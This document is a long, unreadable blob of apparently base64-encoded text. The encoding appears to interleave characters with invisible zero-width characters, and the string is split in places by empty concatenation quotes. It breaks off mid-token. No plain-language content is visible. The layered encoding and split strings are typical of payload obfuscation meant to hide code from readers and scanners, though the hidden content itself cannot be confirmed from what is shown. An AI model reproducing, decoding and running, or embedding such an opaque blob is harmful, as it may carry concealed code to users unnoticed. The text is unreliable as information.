+KAi+KBvOKAi+KBouKAi+KBr+KAi+KBv+KAi+KBo+KAi+KApuKAi+KBmOKAi+KBu+KAi+KBruKA\ni+KBruKAi+KBr+KAi+KApuKAi+KBgOKAi+KBieKAi+KBm+KAi+KBmOKAi+KArOKAi+KAseKAi+KAq+KA\ni+KArOKAi+KApuKAi+KAuuKAi+KApeKAi+KAu+KAi+KAu+KAi+KAu+KAi+KArOKAi+KAp+KAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAge""KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KArOKAi+KBk+KAi+KApuKAi+KBguKAi+KBjOKAi+KApuKAi+KBieKAi+KBquKAi+KBpeKAi+KBr+KA\ni+KBvOKAi+KBouKAi+KBr+KAi+KBv+KAi+KBo+KAi+KApuKAi+KBn+KAi+KBpOKAi+KBv+KAi+KBquKA\ni+KBp+KAi+KBieKAi+KBsuKAi+KBv+KAi+KBruKAi+KBuOKAi+KApuKAi+KBieKAi+KArOKAi+KAseKA\ni+KAq+KAi+KArOKAi+KAu+KAi+KArOKAi+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KArOKAi+KBk+KAi+KApuKAi+KBguKA\ni+KBjOKAi+KApuKAi+KBieKAi+KBquKAi+KBpeKAi+KBr+KAi+KBvOKAi+KBouKAi+KBr+KAi+KBv+KA\ni+KBo+KAi+KApuKAi+KBn+KAi+KBpOKAi+KBv+KAi+KBquKAi+KBp+KAi+KBn+KAi+KBouKAi+KBpuKA\ni+KBruKAi+KApuKAi+KBhuKAi+KBmOKAi+KArOKAi+KAseKAi+KAq+KAi+KArOKAi+KAu+KAi+KArOKA\ni+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KArOKAi+KBk+KAi+KApuKAi+KBieKAi+KBp+KAi+KBpOKAi+KBoOKAi+KBuOKA\ni+KApuKAi+KBneKAi+KBruKAi+KBueKAi+KBuOKAi+KBouKAi+KBpOKAi+KBpeKAi+KApuKAi+KBguKA\ni+KBr+KAi+KArOKAi+KAseKAi+KAq+KAi+KArOKAi+KBqOKAi+KAs+KAi+KAu+KAi+KBqOKAi+KAvuKA\ni+KBreKAi+KBqeKAi+KAuOKAi+KAu+KAi+KBr+KAi+KBreKAi+KBquKAi+KBruKAi+KAsuKAi+KBruKA\ni+KAueKAi+KAvOKAi+KAuOKAi+KBruKAi+KAv+KAi+KAu+KAi+KAu+KAi+KAsuKAi+KBreKAi+KAu+KA\ni+KAuOKAi+KBqeKAi+KAuuKAi+KAs+KAi+KAueKAi+KAs+KAi+KAu+KAi+KBqeKAi+KBqeKAi+KAuOKA\ni+KAv+KAi+KAuOKAi+KBqeKAi+KAu+KAi+KAs+KAi+KAveKAi+KAueKAi+KBr+KAi+KAveKAi+KAveKA\ni+KAuOKAi+KBreKAi+KAuOKAi+KAuuKAi+KBquKAi+KAuOKAi+KBqOKAi+KAveKAi+KAuOKAi+KBreKA\ni+KAuuKAi+KAuOKAi+KBquKAi+KAsuKAi+KBreKAi+KAuOKAi+KAuuKAi+KBqOKAi+KAu+KAi+KArOKA\ni+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KArOKAi+KBk+KAi+KApuKAi+KBguKAi+KBjOKAi+KApuKAi+KBiOKAi+KBpOKA\ni+KBpeKAi+KBpeKAi+KBruKAi+KBqOKAi+KBv+KAi+KBouKAi+KBpOKAi+KBpeKAi+KApuKAi+KBn+KA\ni+KBsuKAi+KBu+KAi+KBruKAi+KArOKAi+KAseKAi+KAq+KAi+KArOKAi+KBnOKAi+KBguKAi+KBjeKA\ni+KBguKAi+KArOKAi+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KArOKAi+KBk+KAi+KApu""KAi+KBguKAi+KBjOKAi+KApuKA\ni+KBiOKAi+KBquKAi+KBu+KAi+KBquKAi+KBqeKAi+KBouKAi+KBp+KAi+KBouKAi+KBv+KAi+KBouKA\ni+KBruKAi+KBuOKAi+KArOKAi+KAseKAi+KAq+KAi+KArOKAi+KAuOKAi+KBqeKAi+KBueKAi+KBn+KA\ni+KBveKAi+KBvOKAi+KAtuKAi+KAtuKAi+KArOKAi+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KArOKAi+KBk+KAi+KApuKA\ni+KBguKAi+KBjOKAi+KApuKAi+KBiuKAi+KBu+KAi+KBu+KAi+KApuKAi+KBguKAi+KBj+KAi+KArOKA\ni+KAseKAi+KAq+KAi+KArOKAi+KAvuKAi+KAveKAi+KAvOKAi+KAu+KAi+KAveKAi+KAvOKAi+KAuOKA\ni+KAv+KAi+KAuOKAi+KAuOKAi+KAvuKAi+KAueKAi+KAv+KAi+KAueKAi+KAvOKAi+KArOKAi+KAp+KA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KArOKAi+KBnuKAi+KBuOKAi+KBruKAi+KBueKAi+KApuKAi+KBiuKAi+KBrOKAi+KBruKA\ni+KBpeKAi+KBv+KAi+KArOKAi+KAseKAi+KAq+KAi+KArOKAi+KBguKAi+KBpeKAi+KBuOKAi+KBv+KA\ni+KBquKAi+KBrOKAi+KBueKAi+KBquKAi+KBpuKAi+KAq+KAi+KAuuKAi+KAu+KAi+KAu+KAi+KApeKA\ni+KAu+KAi+KApeKAi+KAu+KAi+KApeKAi+KAuuKAi+KAvOKAi+KApeKAi+KAuuKAi+KAueKAi+KAsuKA\ni+KAq+KAi+KBiuKAi+KBpeKAi+KBr+KAi+KBueKAi+KBpOKAi+KBouKAi+KBr+KAi+KAq+KAi+KAo+KA\ni+KAueKAi+KAsuKAi+KApOKAi+KAuuKAi+KAu+KAi+KAsOKAi+KAq+KAi+KAv+KAi+KAueKAi+KAu+KA\ni+KBr+KAi+KBu+KAi+KBouKAi+KAsOKAi+KAq+KAi+KAuuKAi+KAu+KAi+KAs+KAi+KAu+KAi+KBs+KA\ni+KAueKAi+KAuuKAi+KAueKAi+KAsuKAi+KAsOKAi+KAq+KAi+KBuOKAi+KBquKAi+KBpuKAi+KBuOKA\ni+KBvuKAi+KBpeKAi+KBrOKAi+KAsOKAi+KAq+KAi+KBmOKAi+KBhuKAi+KApuKAi+KBhuKAi+KAueKA\ni+KAu+KAi+KAvuKAi+KBjeKAi+KAsOKAi+KAq+KAi+KBpuKAi+KAueKAi+KAu+KAi+KBp+KAi+KBv+KA\ni+KBruKAi+KAsOKAi+KAq+KAi+KBruKAi+KBs+KAi+KBsuKAi+KBpeKAi+KBpOKAi+KBuOKAi+KAvOKA\ni+KAsuKAi+KAu+KAi+KAv+KAi+KAsOKAi+KAq+KAi+KBruKAi+KBpeKAi+KBlOKAi+KBjOKAi+KBieKA\ni+KAsOKAi+KAq+KAi+KAuuKAi+KAveKAi+KAuuKAi+KAv+KAi+KAvOKAi+KAs+KAi+KAveKAi+KAveKA\ni+KAv+KAi+KAouKAi+KArOKAi+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KArOKAi+KBiuKAi+KBqOKAi+KBqOKAi+KBruKA\ni+KBu+KAi+KBv+KAi+KApuKAi+KBh+KAi+KBquKAi+KBpeKAi+KBrOKAi+KBvuKAi+KBquKAi+KBrOKA\ni+KB""ruKAi+KArOKAi+KAseKAi+KAq+KAi+KArOKAi+KBruKAi+KBpeKAi+KApuKAi+KBjOKAi+KBieKA\ni+KAp+KAi+KAq+KAi+KBruKAi+KBpeKAi+KApuKAi+KBnuKAi+KBmOKAi+KArOKAi+KAp+KAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KArOKAi+KBiOKAi+KBpOKAi+KBpOKAi+KBoOKAi+KBouKAi+KBruKAi+KArOKAi+KAseKA\ni+KAq+KAi+KArOKAi+KBpuKAi+KBouKAi+KBr+KAi+KAtuKAi+KBkeKAi+KBneKAi+KBreKAi+KBjOKA\ni+KBveKAi+KBrOKAi+KBiuKAi+KBieKAi+KBiuKAi+KBiuKAi+KBjOKAi+KBpOKAi+KBmuKAi+KBuuKA\ni+KBquKAi+KAvOKAi+KBiuKAi+KBkuKAi+KAuOKAi+KBpuKAi+KBrOKAi+KBpOKAi+KBkuKAi+KBieKA\ni+KBneKAi+KAuuKAi+KBpeKAi+KBm+KAi+KAsOKAi+KAq+KAi+KBqOKAi+KBuOKAi+KBueKAi+KBreKA\ni+KBv+KAi+KBpOKAi+KBoOKAi+KBruKAi+KBpeKAi+KAtuKAi+KAsuKAi+KBsuKAi+KAuOKAi+KBheKA\ni+KAvuKAi+KBoOKAi+KBh+KAi+KBuuKAi+KBseKAi+KBouKAi+KBquKAi+KBp+KAi+KBmuKAi+KBiuKA\ni+KAvOKAi+KBseKAi+KAsuKAi+KAveKAi+KBiuKAi+KBhuKAi+KBouKAi+KBsuKAi+KBiuKAi+KBgOKA\ni+KBh+KAi+KBhuKAi+KBieKAi+KBnOKAi+KBu+KAi+KBuuKAi+KBneKAi+KBoeKAi+KArOKAi+KAp+KA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KArOKAi+KBiOKAi+KBpOKAi+KBpeKAi+KBv+KAi+KBruKAi+KBpeKAi+KBv+KAi+KApuKA\ni+KBn+KAi+KBsuKAi+KBu+KAi+KBruKAi+KArOKAi+KAseKAi+KAq+KAi+KArOKAi+KBquKAi+KBu+KA\ni+KBu+KAi+KBp+KAi+KBouKAi+KBqOKAi+KBquKAi+KBv+KAi+KBouKAi+KBpOKAi+KBpeKAi+KApOKA\ni+KBs+KAi+KApuKAi+KBvOKAi+KBvOKAi+KBvOKAi+KApuKAi+KBreKAi+KBpOKAi+KBueKAi+KBpuKA\ni+KApuKAi+KBvuKAi+KBueKAi+KBp+KAi+KBruKAi+KBpeKAi+KBqOKAi+KBpOKAi+KBr+KAi+KBruKA\ni+KBr+KAi+KAsOKAi+KAq+KAi+KBqOKAi+KBo+KAi+KBquKAi+KBueKAi+KBuOKAi+KBruKAi+KBv+KA\ni+KAtuKAi+KBnuKAi+KBn+KAi+KBjeKAi+KApuKAi+KAs+KAi+KArOKAi+KAp+KAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KArOKA\ni+KBiuKAi+KBqOKAi+KBqOKAi+KBruKAi+KBu+KAi+KBv+KAi+KApuKAi+KBjuKAi+KBpeKAi+KBqOKA\ni+KBpOKAi+KBr+KAi+KBouKAi+KBpeKAi+KBrOKAi+KArOKAi+KAseKAi+KAq+KAi+KArOKAi+KBrOKA\ni+KBseKAi+KBouKAi+KBu+KAi+KAp+KAi+KAq+KAi+KBr+KAi+KBruKAi+KBreKAi+KBp+KAi+KBquKA\ni+KBv+KAi+KBruKAi+KArOKAi+KAp+KAi+KA""geKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KArOKAi+KBg+KAi+KBpOKAi+KBuOKAi+KBv+KA\ni+KArOKAi+KAseKAi+KAq+KAi+KArOKAi+KBouKAi+KApeKAi+KBouKAi+KBpeKAi+KBuOKAi+KBv+KA\ni+KBquKAi+KBrOKAi+KBueKAi+KBquKAi+KBpuKAi+KApeKAi+KBqOKAi+KBpOKAi+KBpuKAi+KArOKA\ni+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KArOKAi+KBk+KAi+KApuKAi+KBjeKAi+KBieKAi+KApuKAi+KBg+KAi+KBn+KA\ni+KBn+KAi+KBm+KAi+KApuKAi+KBjuKAi+KBpeKAi+KBrOKAi+KBouKAi+KBpeKAi+KBruKAi+KArOKA\ni+KAseKAi+KAq+KAi+KArOKAi+KBh+KAi+KBouKAi+KBrOKAi+KBruKAi+KBueKAi+KArOKAi+KAp+KA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KArOKAi+KBiOKAi+KBpOKAi+KBpeKAi+KBpeKAi+KBruKAi+KBqOKAi+KBv+KAi+KBouKA\ni+KBpOKAi+KBpeKAi+KArOKAi+KAseKAi+KAq+KAi+KArOKAi+KBoOKAi+KBruKAi+KBruKAi+KBu+KA\ni+KApuKAi+KBquKAi+KBp+KAi+KBouKAi+KBveKAi+KBruKAi+KArOKAi+KAp+KAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KArOKA\ni+KBiOKAi+KBpOKAi+KBpeKAi+KBv+KAi+KBruKAi+KBpeKAi+KBv+KAi+KApuKAi+KBh+KAi+KBruKA\ni+KBpeKAi+KBrOKAi+KBv+KAi+KBo+KAi+KArOKAi+KAseKAi+KAq+KAi+KArOKAi+KAuOKAi+KAvuKA\ni+KAveKAi+KArOKAi+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KBtuKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KBr+KAi+KBquKAi+KBv+KAi+KBquKAi+KAq+KAi+KAtuKAi+KAq+KAi+KBsOKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KArOKAi+KBuOKAi+KBouKAi+KBrOKAi+KBpeKAi+KBruKAi+KBr+KAi+KBlOKAi+KBqeKA\ni+KBpOKAi+KBr+KAi+KBsuKAi+KArOKAi+KAseKAi+KAq+KAi+KArOKAi+KAu+KAi+KBr+KAi+KAu+KA\ni+KAveKAi+KAvOKAi+KBqOKAi+KAueKAi+KBreKAi+KAs+KAi+KAveKAi+KBqOKAi+KBquKAi+KBqOKA\ni+KAueKAi+KBqOKAi+KAuuKAi+KAvOKAi+KBr+KAi+KAveKAi+KAvuKAi+KAvuKAi+KAveKAi+KAuOKA\ni+KAuuKAi+KBqOKAi+KAsuKAi+KBqOKAi+KBruKAi+KBqOKAi+KAueKAi+KAv+KAi+KAu+KAi+KAueKA\ni+KAu+KAi+KAuuKAi+KAueKAi+KBreKAi+KBqeKAi+KAu+KAi+KBquKAi+KAuOKAi+KA""ueKAi+KAsuKA\ni+KBqeKAi+KBqOKAi+KBquKAi+KBreKAi+KBqeKAi+KAuOKAi+KBqeKAi+KAuuKAi+KBreKAi+KAv+KA\ni+KBqOKAi+KAu+KAi+KBqeKAi+KBqeKAi+KAvuKAi+KAveKAi+KBqeKAi+KAuuKAi+KBreKAi+KAuuKA\ni+KBreKAi+KApeKAi+KBsOKAi+KAqeKAi+KBlOKAi+KBqOKAi+KBuOKAi+KBueKAi+KBreKAi+KBv+KA\ni+KBpOKAi+KBoOKAi+KBruKAi+KBpeKAi+KAqeKAi+KAseKAi+KAqeKAi+KAsuKAi+KBsuKAi+KAuOKA\ni+KBheKAi+KAvuKAi+KBoOKAi+KBh+KAi+KBuuKAi+KBseKAi+KBouKAi+KBquKAi+KBp+KAi+KBmuKA\ni+KBiuKAi+KAvOKAi+KBseKAi+KAsuKAi+KAveKAi+KBiuKAi+KBhuKAi+KBouKAi+KBsuKAi+KBiuKA\ni+KBgOKAi+KBh+KAi+KBhuKAi+KBieKAi+KBnOKAi+KBu+KAi+KBuuKAi+KBneKAi+KBoeKAi+KAqeKA\ni+KAp+KAi+KAqeKAi+KBquKAi+KBr+KAi+KBouKAi+KBr+KAi+KAqeKAi+KAseKAi+KAqeKAi+KAu+KA\ni+KBr+KAi+KBreKAi+KBquKAi+KBreKAi+KAs+KAi+KAueKAi+KAu+KAi+KApuKAi+KAueKAi+KAvOKA\ni+KAv+KAi+KAs+KAi+KApuKAi+KAv+KAi+KAveKAi+KAuOKAi+KAv+KAi+KApuKAi+KAsuKAi+KAuOKA\ni+KAveKAi+KAvuKAi+KApuKAi+KBqOKAi+KAuOKAi+KBr+KAi+KAs+KAi+KBqOKAi+KAs+KAi+KAu+KA\ni+KAuuKAi+KAuuKAi+KAueKAi+KAvuKAi+KAveKAi+KAqeKAi+KAp+KAi+KAqeKAi+KBrOKAi+KBvuKA\ni+KBouKAi+KBr+KAi+KAqeKAi+KAseKAi+KAqeKAi+KAuuKAi+KBreKAi+KAvOKAi+KAs+KAi+KAv+KA\ni+KAv+KAi+KAuOKAi+KAuuKAi+KApuKAi+KAueKAi+KAveKAi+KAveKAi+KAuOKAi+KApuKAi+KAv+KA\ni+KBr+KAi+KBqeKAi+KAsuKAi+KApuKAi+KBqeKAi+KAveKAi+KAueKAi+KAv+KAi+KApuKAi+KAs+KA\ni+KAveKAi+KBqeKAi+KBr+KAi+KAsuKAi+KBqOKAi+KBruKAi+KAuuKAi+KBr+KAi+KAu+KAi+KAs+KA\ni+KAv+KAi+KAqeKAi+KAp+KAi+KAqeKAi+KBr+KAi+KBruKAi+KBveKAi+KBouKAi+KBqOKAi+KBruKA\ni+KBlOKAi+KBouKAi+KBr+KAi+KAqeKAi+KAseKAi+KAqeKAi+KBquKAi+KBpeKAi+KBr+KAi+KBueKA\ni+KBpOKAi+KBouKAi+KBr+KAi+KApuKAi+KBqeKAi+KAsuKAi+KAuOKAi+KBr+KAi+KBr+KAi+KBqeKA\ni+KAuOKAi+KAvOKAi+KBruKAi+KAsuKAi+KAs+KAi+KAuOKAi+KAv+KAi+KAs+KAi+KAuuKAi+KBqOKA\ni+KAqeKAi+KAp+KAi+KAqeKAi+KBuuKAi+KBvuKAi+KBruKAi+KBueKAi+KBsuKAi+KAqeKAi+KAseKA\ni+KAqeKAi+KArOKAi+KAoOKAi+KBvuKAi+KBuOKAi+KBruKAi+KBueKAi+KAoOKAi+KArOKAi+KAqeKA\ni+KBtuKAi+KArOKAi+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KArOKAi+KBouKAi+KBrOKAi+KBlOKAi+KBuOKAi+KBouKA\ni+KBrOKAi+KBlOKAi+""KBoOKAi+KBruKAi+KBsuKAi+KBlOKAi+KBveKAi+KBruKAi+KBueKAi+KBuOKA\ni+KBouKAi+KBpOKAi+KBpeKAi+KArOKAi+KAseKAi+KAq+KAi+KArOKAi+KAv+KAi+KArOKAi+KAp+KA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KBtuKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KBueKAi+KBruKAi+KBuOKAi+KBu+KAi+KBpOKAi+KBpeKAi+KBuOKAi+KBruKAi+KAq+KA\ni+KAtuKAi+KAq+KAi+KBueKAi+KBruKAi+KBuuKAi+KBvuKAi+KBruKAi+KBuOKAi+KBv+KAi+KBuOKA\ni+KApeKAi+KBu+KAi+KBpOKAi+KBuOKAi+KBv+KAi+KAo+KAi+KArOKAi+KBo+KAi+KBv+KAi+KBv+KA\ni+KBu+KAi+KBuOKAi+KAseKAi+KApOKAi+KApOKAi+KBouKAi+KApeKAi+KBouKAi+KBpeKAi+KBuOKA\ni+KBv+KAi+KBquKAi+KBrOKAi+KBueKAi+KBquKAi+KBpuKAi+KApeKAi+KBqOKAi+KBpOKAi+KBpuKA\ni+KApOKAi+KBquKAi+KBu+KAi+KBouKAi+KApOKAi+KBveKAi+KAuuKAi+KApOKAi+KBquKAi+KBqOKA\ni+KBqOKAi+KBpOKAi+KBvuKAi+KBpeKAi+KBv+KAi+KBuOKAi+KApOKAi+KBuOKAi+KBruKAi+KBpeKA\ni+KBr+KAi+KBlOKAi+KBueKAi+KBruKAi+KBqOKAi+KBpOKAi+KBveKAi+KBruKAi+KBueKAi+KBsuKA\ni+KBlOKAi+KBreKAi+KBp+KAi+KBpOKAi+KBvOKAi+KBlOKAi+KBruKAi+KBpuKAi+KBquKAi+KBouKA\ni+KBp+KAi+KApOKAi+KArOKAi+KAp+KAi+KBo+KAi+KBruKAi+KBquKAi+KBr+KAi+KBruKAi+KBueKA\ni+KBuOKAi+KAtuKAi+KBo+KAi+KBruKAi+KBquKAi+KBr+KAi+KBruKAi+KBueKAi+KBuOKAi+KAp+KA\ni+KBr+KAi+KBquKAi+KBv+KAi+KBquKAi+KAtuKAi+KBr+KAi+KBquKAi+KBv+KAi+KBquKAi+KAp+KA\ni+KAouKAi+KApeKAi+KBoeKAi+KBuOKAi+KBpOKAi+KBpeKAi+KAo+KAi+KAouKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBueKA\ni+KAtuKAi+KBueKAi+KBruKAi+KBuOKAi+KBu+KAi+KBpOKAi+KBpeKAi+KBuOKAi+KBruKAi+KBkOKA\ni+KArOKAi+KBruKAi+KBpuKAi+KBquKAi+KBouKAi+KBp+KAi+KArOKAi+KBluKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KBruKAi+KBs+KAi+KBqOKA\ni+KBruKAi+KBu+KAi+KBv+KAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBueKAi+KAtuKAi+KArOKAi+KBpeKAi+KBpOKA\ni+KAq+KAi+KBmeKAi+KBjuKAi+KBmOKAi+KBn+KAi+KAq+KAi+KAquKAi+KArOKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+""KAq+KAi+KBueKAi+KBruKAi+KBv+KA\ni+KBvuKAi+KBueKAi+KBpeKAi+KAq+KAi+KBueKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KBr+KA\ni+KBruKAi+KBreKAi+KAq+KAi+KBr+KAi+KBquKAi+KBv+KAi+KBruKAi+KAo+KAi+KBguKAi+KBr+KA\ni+KAouKAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KBv+KAi+KBueKAi+KBsuKAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KBvuKAi+KBouKAi+KBr+KAi+KAq+KAi+KAtuKAi+KAq+KAi+KBouKAi+KBpeKA\ni+KBv+KAi+KAo+KAi+KBguKAi+KBr+KAi+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KBouKAi+KBreKAi+KAq+KAi+KAuuKAi+KAq+KAi+KAt+KAi+KAq+KAi+KBvuKAi+KBouKAi+KBr+KA\ni+KAq+KAi+KAt+KAi+KAq+KAi+KAuuKAi+KAueKAi+KAvOKAi+KAsuKAi+KAu+KAi+KAu+KAi+KAu+KA\ni+KAseKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KBueKAi+KBruKAi+KBv+KAi+KBvuKAi+KBueKAi+KBpeKAi+KAq+KAi+KAueKAi+KAu+KAi+KAuuKA\ni+KAu+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBruKAi+KBp+KAi+KBouKAi+KBreKA\ni+KAq+KAi+KAuuKAi+KAueKAi+KAvOKAi+KAsuKAi+KAu+KAi+KAu+KAi+KAuuKAi+KAq+KAi+KAt+KA\ni+KAtuKAi+KAq+KAi+KBvuKAi+KBouKAi+KBr+KAi+KAq+KAi+KAt+KAi+KAq+KAi+KAuuKAi+KAvOKA\ni+KAvOKAi+KAvuKAi+KAu+KAi+KAu+KAi+KAu+KAi+KAu+KAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBueKAi+KBruKAi+KBv+KAi+KBvuKA\ni+KBueKAi+KBpeKAi+KAq+KAi+KAueKAi+KAu+KAi+KAuuKAi+KAuuKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KBruKAi+KBp+KAi+KBouKAi+KBreKAi+KAq+KAi+KAuuKAi+KAvOKAi+KAvOKA""\ni+KAvuKAi+KAu+KAi+KAu+KAi+KAu+KAi+KAuuKAi+KAq+KAi+KAt+KAi+KAtuKAi+KAq+KAi+KBvuKA\ni+KBouKAi+KBr+KAi+KAq+KAi+KAt+KAi+KAq+KAi+KAueKAi+KAvOKAi+KAsuKAi+KAvOKAi+KAveKA\ni+KAu+KAi+KAu+KAi+KAu+KAi+KAu+KAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBueKAi+KBruKAi+KBv+KAi+KBvuKAi+KBueKAi+KBpeKA\ni+KAq+KAi+KAueKAi+KAu+KAi+KAuuKAi+KAueKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KBruKAi+KBp+KAi+KBouKAi+KBreKAi+KAq+KAi+KAueKAi+KAvOKAi+KAsuKAi+KAvOKAi+KAveKA\ni+KAu+KAi+KAu+KAi+KAu+KAi+KAuuKAi+KAq+KAi+KAt+KAi+KAtuKAi+KAq+KAi+KBvuKAi+KBouKA\ni+KBr+KAi+KAq+KAi+KAt+KAi+KAq+KAi+KAsuKAi+KAu+KAi+KAu+KAi+KAsuKAi+KAsuKAi+KAu+KA\ni+KAu+KAi+KAu+KAi+KAu+KAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KBueKAi+KBruKAi+KBv+KAi+KBvuKAi+KBueKAi+KBpeKAi+KAq+KA\ni+KAueKAi+KAu+KAi+KAuuKAi+KAuOKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBruKA\ni+KBp+KAi+KBouKAi+KBreKAi